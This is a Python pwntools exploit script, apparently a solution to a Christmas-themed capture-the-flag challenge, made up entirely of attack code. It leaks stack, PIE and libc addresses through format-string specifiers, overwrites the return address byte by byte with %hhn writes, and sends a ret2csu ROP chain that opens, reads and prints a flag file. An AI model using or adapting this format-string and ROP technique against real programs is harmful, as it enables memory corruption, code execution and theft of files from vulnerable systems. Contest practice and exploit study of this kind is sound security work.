from pwn import *

r = remote("challs.xmas.htsp.ro", 12003)
r = remote("127.0.0.1", 12341)
input("")
context.arch = 'amd64'

print(r.sendlineafter("you?\n","%7$p"))
leak = str(r.recvline())
print(leak.split(" "))
main_ret = int(leak.split(" ")[2][:-3], 16) - 0x50 + 0x18

print(hex(main_ret))

print(r.sendlineafter("Santa\n","%39$p %40$p %41$p"))
leak = str(r.recvline())
print(leak.split(" "))

PIE = int(leak.split(" ")[9], 16) - 0xc00
libc_main = int(leak.split(" ")[10][:-3], 16)

libc = libc_main - 0x21b97

addr_write2ret = PIE + 0xc5d # pop_rsp_pop3_ret

ad = []
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
print(ad)

for i in range(6):
	payload = b'%' + str.encode(str(ad[i])) + b"c%6$hhn"
	length = len(payload)
	payload += b'a' * ( (8 - (length % 8)) % 8)
	l2 = len(payload) // 8
	
	payload = b'%' + str.encode(str(ad[i])) + b"c%"+ str.encode(str(6+l2))   + b"$hhn" 
	payload += b'a' * ( (8 - (length % 8)) % 8)
	payload += p64(main_ret+i)
	print(payload)
	r.sendline(payload)
	print(r.recv())


addr_write2ret = main_ret - 0x18 - 0x100 + 0x10# pop
buf = main_ret - 0x18 - 0x100 +0x10# pop

ad = []
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)
addr_write2ret //= 256
ad.append(addr_write2ret % 256)


for i in range(6):
	payload = b'%' + str.encode(str(ad[i])) + b"c%6$hhn"
	length = len(payload)
	payload += b'a' * ( (8 - (length % 8)) % 8)
	l2 = len(payload) // 8
	payload = b'%' + str.encode(str(ad[i])) + b"c%"+ str.encode(str(6+l2))   + b"$hhn" 
	payload += b'a' * ( (8 - (length % 8)) % 8)
	payload += p64(main_ret+8+i)
	print(payload)
	r.sendline(payload)
	print(r.recv())

csu_head = PIE + 0xc40
csu_reset = PIE + 0xc5a

open_pos = libc + 0x10fe70
read_pos = libc + 0x110070
write_pos = libc + 0x110140

writable = PIE + 0x202000

payload = b"end of letteraaa"
payload += flat([open_pos, "/flag.tx", "t\x00\x00\x00\x00\x00\x00\x00", csu_reset])
payload += flat([0, 1, buf, -100, buf + 8, 0,csu_head, 0])
payload += flat([0, 1, buf+8*19, 0, writable, 256,csu_head, read_pos])
payload += flat([0, 1, buf+8*27, 1, writable, 256,csu_head, write_pos])

print(len(payload))
r.sendline(payload)
print(r.recvuntil("year!"))

print(r.recvuntil("}"))
